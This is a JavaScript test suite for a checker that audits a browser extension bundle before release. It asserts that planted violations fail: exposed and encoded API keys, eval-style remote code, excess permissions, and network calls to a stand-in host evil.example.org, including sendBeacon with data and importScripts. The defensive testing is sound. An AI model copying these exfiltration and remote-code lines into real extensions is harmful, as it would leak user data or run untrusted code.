// Self-tests for the G10 checker: each check must catch a planted violation and accept a clean bundle.
// Synthetic bundles only (strings), no transaction data.
import { test } from "node:test";
import assert from "node:assert/strict";
import { Buffer } from "node:buffer";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { readZip, writeZip } from "../src/zip.mjs";
import {
  checkHosts, validateInertEntries, checkNoSecrets, checkNoRemoteCode, checkPermissions, checkLicenseKeyEmbedded,
  checkDependencyLicenses, licenseForbidden, checkContentScriptsOffline, secretVariants,
  checkNoPageControl, checkPassThroughUnwritable
} from "../src/security-checks.mjs";

const PK = "96kkANgM8egAtbFSa81PHfjNFajQNo77dpTcno2xmM1s";
const FAKE_KEY = "0f0e0d0c-1111-4222-8333-444455556666";
const bundle = (files) => new Map(Object.entries(files).map(([k, v]) => [k, Buffer.from(v)]));
const goodManifest = {
  manifest_version: 3, name: "x", permissions: ["storage"],
  host_permissions: ["https://mainnet.helius-rpc.com/*", "https://devnet.helius-rpc.com/*", "http://localhost:8899/*"],
  content_scripts: [{ matches: ["https://*/*", "http://localhost/*", "http://127.0.0.1/*"], js: ["hook.js"], world: "MAIN" }]
};
const clean = () => bundle({
  "manifest.json": JSON.stringify(goodManifest),
  "service-worker.js": `const u="https://mainnet.helius-rpc.com/?api-key="+k;fetch("http://localhost:8899");const PK="${PK}";`,
  "ui.js": `document.createElementNS("http://www.w3.org/2000/svg","svg");if(window.top!==self)console.info(n.wallet,e.network)`,
  "hook.js": `window.postMessage({t:1},"*")`
});

test("clean bundle passes every check", () => {
  const b = clean();
  assert.equal(checkHosts(b).status, "PASS");
  assert.equal(checkNoRemoteCode(b, goodManifest).status, "PASS");
  assert.equal(checkPermissions(goodManifest).status, "PASS");
  assert.equal(checkLicenseKeyEmbedded(b, PK).status, "PASS");
  assert.equal(checkNoSecrets(b, [FAKE_KEY]).status, "PASS");
  assert.equal(checkContentScriptsOffline(b, goodManifest).status, "PASS");
});

test("hosts: manifest content_scripts matches are exempt, other manifest hosts are not", () => {
  assert.equal(checkHosts(bundle({ "manifest.json": JSON.stringify(goodManifest) })).status, "PASS");
  const bad = { ...goodManifest, homepage_url: "https://kelvara.example.com" };
  assert.equal(checkHosts(bundle({ "manifest.json": JSON.stringify(bad) })).status, "FAIL");
});

test("hosts: dynamic hosts must end in a Helius RPC domain", () => {
  assert.equal(checkHosts(bundle({ "a.js": "u=`https://${net}.helius-rpc.com/?api-key=${k}`" })).status, "PASS");
  assert.equal(checkHosts(bundle({ "a.js": "u=`https://${host}/rpc`" })).status, "FAIL");
  assert.equal(checkHosts(bundle({ "a.js": "u=`https://${x}.evil.com/`" })).status, "FAIL");
});

test("hosts: only the two Helius API hosts are allowed", () => {
  assert.equal(checkHosts(bundle({ "a.js": '"https://api.helius.xyz/v0" "https://api-mainnet.helius-rpc.com/v0"' })).status, "PASS");
  assert.equal(checkHosts(bundle({ "a.js": '"https://api-devnet.helius.xyz/v0"' })).status, "FAIL");
});

test("hosts: forbidden URLs and bare domains fail", () => {
  for (const s of ['fetch("https://api.coingecko.com/api/v3")', 'x="https://api.mainnet-beta.solana.com"',
    'a="api."+"solscan.io"; b="solscan.io/tx/"', 'new WebSocket("wss://evil.example.org/ws")', 'u="https://api.openai.com/v1"']) {
    const r = checkHosts(bundle({ "a.js": s }));
    assert.equal(r.status, "FAIL", s);
  }
});

test("secrets: key value, api-key=<uuid> and key files fail", () => {
  assert.equal(checkNoSecrets(bundle({ "a.js": `k="${FAKE_KEY}"` }), [FAKE_KEY]).status, "FAIL");
  assert.equal(checkNoSecrets(bundle({ "a.js": `u="https://x/?api-key=${FAKE_KEY}"` }), []).status, "FAIL");
  assert.equal(checkNoSecrets(bundle({ ".env": "HELIUS_API_KEY=" }), []).status, "FAIL");
  assert.equal(checkNoSecrets(bundle({ "keys/devnet.keypair.json": "[1,2]" }), []).status, "FAIL");
});

test("secrets: encoded forms of the key and the raw zip bytes are checked", () => {
  const b64 = (pre) => Buffer.from(pre + FAKE_KEY + "tail").toString("base64");
  for (const enc of [FAKE_KEY.replace(/-/g, ""), FAKE_KEY.toUpperCase(), Buffer.from(FAKE_KEY).toString("hex"),
    [...FAKE_KEY].reverse().join(""), b64(""), b64("a"), b64("ab"), b64("abc")]) {
    assert.equal(checkNoSecrets(bundle({ "a.js": `x="${enc}"` }), [FAKE_KEY]).status, "FAIL", enc);
  }
  assert.ok(secretVariants(FAKE_KEY).every((v) => v.length >= 8));
  const raw = writeZip({ [`notes-${FAKE_KEY}.txt`]: "x" });
  assert.equal(checkNoSecrets(bundle({ "a.js": "ok" }), [FAKE_KEY], raw).status, "FAIL");
});

test("content scripts: network calls fail, missing files fail", () => {
  for (const s of ['fetch("/x")', "new XMLHttpRequest()", 'new WebSocket("ws://localhost:8900")', "navigator.sendBeacon(u)"]) {
    assert.equal(checkContentScriptsOffline(bundle({ "hook.js": s }), goodManifest).status, "FAIL", s);
  }
  assert.equal(checkContentScriptsOffline(bundle({}), goodManifest).status, "FAIL");
});

test("remote code: eval, Function, string timers, remote imports and CSP fail", () => {
  for (const s of ["eval(x)", "new Function('return 1')", 'setTimeout("alert(1)",1)', 'importScripts("https://x.y/a.js")',
    'import("https://cdn.x/a.js")']) {
    assert.equal(checkNoRemoteCode(bundle({ "a.js": s }), goodManifest).status, "FAIL", s);
  }
  assert.equal(checkNoRemoteCode(bundle({ "p.html": '<script src="https://cdn.x/a.js"></script>' }), goodManifest).status, "FAIL");
  assert.equal(checkNoRemoteCode(bundle({}), { content_security_policy: { extension_pages: "script-src 'self' 'unsafe-eval'" } }).status, "FAIL");
  assert.equal(checkNoRemoteCode(bundle({ "a.js": "obj.evaluate(x); retrieval(y)" }), goodManifest).status, "PASS");
  assert.equal(checkNoRemoteCode(bundle({ "a.js": "[].constructor.constructor(s)()" }), goodManifest).status, "FAIL");
  assert.equal(checkNoRemoteCode(bundle({ "a.js": "chrome.scripting.executeScript({target:t,code:s})" }), goodManifest).status, "FAIL");
  const csp = (c) => checkNoRemoteCode(bundle({}), { content_security_policy: { extension_pages: c } }).status;
  assert.equal(csp("script-src 'self' 'wasm-unsafe-eval'; connect-src 'self' https://mainnet.helius-rpc.com"), "PASS");
  assert.equal(csp("script-src 'self'; connect-src https://api.coingecko.com"), "FAIL");
  assert.equal(csp("script-src 'self'; connect-src *"), "FAIL");
});

test("permissions: extra permissions and hosts fail", () => {
  assert.equal(checkPermissions({ ...goodManifest, permissions: ["storage", "tabs"] }).status, "FAIL");
  assert.equal(checkPermissions({ ...goodManifest, host_permissions: ["<all_urls>"] }).status, "FAIL");
  assert.equal(checkPermissions({ ...goodManifest, manifest_version: 2 }).status, "FAIL");
  assert.equal(checkPermissions({ ...goodManifest, host_permissions: ["https://api-devnet.helius.xyz/*"] }).status, "FAIL");
  assert.equal(checkPermissions({ ...goodManifest, content_scripts: [{ matches: ["<all_urls>"], js: ["hook.js"] }] }).status, "FAIL");
  assert.equal(checkPermissions({ ...goodManifest, content_scripts: [{ matches: ["http://*/*"], js: ["hook.js"] }] }).status, "FAIL");
  assert.equal(checkPermissions({ ...goodManifest, externally_connectable: { matches: ["<all_urls>"] } }).status, "FAIL");
  assert.equal(checkPermissions(null).status, "FAIL");
});

test("license key must be embedded", () => {
  assert.equal(checkLicenseKeyEmbedded(bundle({ "a.js": "x" }), PK).status, "FAIL");
});

test("license expressions", () => {
  for (const l of ["MIT", "Apache-2.0", "(MIT OR Apache-2.0)", "ISC", "BSD-3-Clause", "LGPL-3.0", "MPL-2.0 OR MIT"]) assert.equal(licenseForbidden(l), false, l);
  for (const l of ["AGPL-3.0", "MPL-2.0", "BUSL-1.1", "GPL-3.0", null, "UNLICENSED"]) assert.equal(licenseForbidden(l), true, String(l));
});

test("dependency licenses walk a node_modules tree", () => {
  const root = mkdtempSync(path.join(tmpdir(), "g10-"));
  try {
    const pkg = (dir, json) => { mkdirSync(dir, { recursive: true }); writeFileSync(path.join(dir, "package.json"), JSON.stringify(json)); };
    pkg(path.join(root, "packages/core"), { name: "@kelvara/core", dependencies: { good: "1" } });
    pkg(path.join(root, "packages/extension"), { name: "@kelvara/extension", dependencies: {} });
    pkg(path.join(root, "node_modules/good"), { name: "good", version: "1.0.0", license: "MIT", dependencies: { bad: "1" } });
    pkg(path.join(root, "node_modules/bad"), { name: "bad", version: "2.0.0", license: "AGPL-3.0" });
    const r = checkDependencyLicenses(root, ["packages/core", "packages/extension"], "| good |");
    assert.equal(r.status, "FAIL");
    assert.match(r.detail, /bad@2\.0\.0 license AGPL-3\.0/);
    assert.equal(checkDependencyLicenses(root, ["packages/core"], "| good |", { bad: "waived: test" }).status, "PASS");
    assert.match(checkDependencyLicenses(root, ["packages/core"], "", { bad: "x" }).detail, /good missing from LICENSES\.md/);
  } finally { rmSync(root, { recursive: true, force: true }); }
});

test("zip round trip", () => {
  const files = readZip(writeZip({ "manifest.json": "{}", "dir/a.js": "eval(1)" }));
  assert.deepEqual([...files.keys()], ["manifest.json", "dir/a.js"]);
  assert.equal(files.get("dir/a.js").toString(), "eval(1)");
});

test("no page control: externally_connectable, external listeners, storage in content scripts fail", () => {
  assert.equal(checkNoPageControl(clean(), goodManifest).status, "PASS");
  const ec = { ...goodManifest, externally_connectable: { matches: ["https://*/*"] } };
  assert.equal(checkNoPageControl(bundle({ "manifest.json": JSON.stringify(ec) }), ec).status, "FAIL");
  assert.equal(checkNoPageControl(bundle({ "service-worker.js": "chrome.runtime.onMessageExternal.addListener(f)" }), goodManifest).status, "FAIL");
  assert.equal(checkNoPageControl(bundle({ "service-worker.js": "c.runtime.onConnectExternal.addListener(f)" }), goodManifest).status, "FAIL");
  assert.equal(checkNoPageControl(bundle({ "hook.js": "chrome.storage.local.set({passThrough:!0})" }), goodManifest).status, "FAIL");
  assert.equal(checkNoPageControl(bundle({ "hook.js": "n.storage.sync.get(x)" }), goodManifest).status, "FAIL");
  // The service worker may use storage.
  assert.equal(checkNoPageControl(bundle({ "service-worker.js": "chrome.storage.local.set({a:1})", "hook.js": "x" }), goodManifest).status, "PASS");
});

test("passThrough: only the policy readers may name it, and they may not write it", () => {
  const ok = new Map([["sw/settings.ts", 'const K=["passThrough"];x={passThrough: raw.passThrough === true}'], ["sw/policy.ts", "if (settings.passThrough) return"]]);
  assert.equal(checkPassThroughUnwritable(ok).status, "PASS");
  assert.equal(checkPassThroughUnwritable(new Map([...ok, ["options/form.ts", "patch.passThrough = box.checked"]])).status, "FAIL");
  assert.equal(checkPassThroughUnwritable(new Map([...ok, ["service-worker.ts", 'if (m.type==="pt") chrome.storage.local.set({ passThrough: true })']])).status, "FAIL");
  assert.equal(checkPassThroughUnwritable(new Map([["sw/settings.ts", "await chrome.storage.local.set({ passThrough: v })"]])).status, "FAIL");
  assert.equal(checkPassThroughUnwritable(new Map([["sw/policy.ts", "settings.passThrough = true"]])).status, "FAIL");
});

// ---------- V10: network targets vs audited inert strings ----------
const INERT = [{ string: "https://sola.na/web3invariant", file: "a.js", reason: "error message text" }];

test("hosts: an audited inert string passes; the same string unlisted, or listed for another file, fails", () => {
  const src = 'm={[1]:"please file an issue at https://sola.na/web3invariant"}';
  assert.equal(checkHosts(bundle({ "a.js": src }), INERT).status, "PASS");
  assert.equal(checkHosts(bundle({ "a.js": src }), []).status, "FAIL");
  assert.equal(checkHosts(bundle({ "b.js": src }), INERT).status, "FAIL");
  // exact string: a longer URL on the same host is a different occurrence
  assert.equal(checkHosts(bundle({ "a.js": '"https://sola.na/web3invariant/x"' }), INERT).status, "FAIL");
});

test("hosts: an allowlisted string that reaches a network sink fails", () => {
  for (const s of ['fetch("https://sola.na/web3invariant")', 'const u="https://sola.na/web3invariant";fetch(u)',
    'fetch(new URL("/x","https://sola.na/web3invariant"))', 'const b="https://sola.na/web3invariant";fetch(`${b}/x`)',
    'let f=e.fetch??globalThis.fetch.bind(globalThis);f("https://sola.na/web3invariant")']) {
    const r = checkHosts(bundle({ "a.js": s }), INERT);
    assert.equal(r.status, "FAIL", s);
    assert.match(r.detail, /reaches/, s);
  }
});

test("hosts: every sink kind with a foreign host fails", () => {
  for (const s of ['new WebSocket("wss://evil.example.org/ws")', 'new EventSource("https://evil.example.org/s")',
    'importScripts("https://evil.example.org/a.js")', 'navigator.sendBeacon("https://evil.example.org/b",d)',
    'x=new XMLHttpRequest;x.open("GET","https://evil.example.org/")', 'img.src="https://evil.example.org/p.gif"',
    'a.setAttribute("href","https://evil.example.org/")', 'location.assign("https://evil.example.org/")',
    'import("https://evil.example.org/m.js")', 'fetch(`https://${host}/rpc`)']) {
    const inert = [{ string: (s.match(/(?:https|wss):\/\/[^"`]+/) ?? [""])[0], file: "a.js", reason: "mutant: listed to prove the sink check ignores the list" }];
    const r = checkHosts(bundle({ "a.js": s }), inert);
    assert.equal(r.status, "FAIL", s);
    assert.match(r.detail, /reaches/, s);
  }
  assert.equal(checkHosts(bundle({ "r.html": '<img src="https://evil.example.org/p.gif">' }), [{ string: "https://evil.example.org/p.gif", file: "r.html", reason: "mutant" }]).status, "FAIL");
});

test("hosts: Helius and localhost reach sinks freely", () => {
  for (const s of ['fetch("https://mainnet.helius-rpc.com/?api-key="+k)', 'fetch(`https://${n}.helius-rpc.com/`)',
    'new WebSocket("ws://127.0.0.1:8900")', 'const u="http://localhost:8899";fetch(u,{method:"POST"})', 'fetch(e.url)']) {
    assert.equal(checkHosts(bundle({ "a.js": s }), []).status, "PASS", s);
  }
});

test("hosts: allowlist entries must be exact, one-line and complete", () => {
  for (const e of [{ string: "https://*.example.org", file: "a.js", reason: "x" }, { string: "https://sola.na/web3invariant", file: "*.js", reason: "x" },
    { string: "https://sola.na/web3invariant", file: "a.js", reason: "" }, { string: "https://sola.na/web3invariant", file: "a.js" }]) {
    assert.equal(checkHosts(bundle({ "a.js": '"https://sola.na/web3invariant"' }), [e]).status, "FAIL", JSON.stringify(e));
  }
  assert.deepEqual(validateInertEntries(INERT), []);
});

test("hosts: the repo allowlist is well formed", async () => {
  const { readFileSync } = await import("node:fs");
  const list = JSON.parse(readFileSync(new URL("../inert-hosts.json", import.meta.url), "utf8")).entries;
  assert.ok(list.length > 0);
  assert.deepEqual(validateInertEntries(list), []);
});
